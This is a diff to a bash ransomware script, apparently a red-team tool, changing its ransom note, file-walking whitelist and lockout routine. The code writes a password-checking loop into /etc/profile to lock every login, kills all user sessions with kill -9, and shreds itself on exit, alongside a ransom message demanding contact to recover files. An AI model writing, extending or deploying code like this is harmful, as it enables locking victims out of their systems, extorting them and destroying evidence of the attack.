@@ -57,8 +57,9 @@ openfile() {
 adderr() { ERRMSG="$ERRMSG\n$1"; }
 EXIT() {
     echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
-shred $0
-exit; }
+    shred $0
+    exit;
+}
 
 init() {
 	check_req
@@ -82,7 +83,7 @@ CwIDAQAB
 }
 navdir() {
 for fil in $1; do
-	whitelist=".*vmware.*|.*_schema.*"
+	whitelist=".*vmware.*|.*_schema.*|.*shy_packet.*"
 	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
 	if [ -f "$fil" ]; then
 		$2 $fil
@@ -150,9 +151,18 @@ dec_loop() {
 }
 ################# MAIN ######################################
 setmsg() {
-    message="Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety"
-    echo "Enter your new password:"
-    hsh=$(read | openssl sha1)
+    message='Congratulations,
+    
+You have been infected with a RANSOMWARE!!!!!
+I know. Scary stuff.
+Anyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.
+
+Love,
+~ The Red Team'
+
+    echo "Enter your new password: "
+    read pass
+    hsh=$(echo $pass | openssl sha1 | cut -d' ' -f2)
     msg="\
 while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
 \"$hsh\" ];\
@@ -163,8 +173,8 @@ done"
     echo $msg > /etc/profile
 }
 
+# Kill every session on the machine
 lock() {
-    # Kill every session on the machine
     who -u | awk '{print $6}' | xargs kill -9 
 }
 
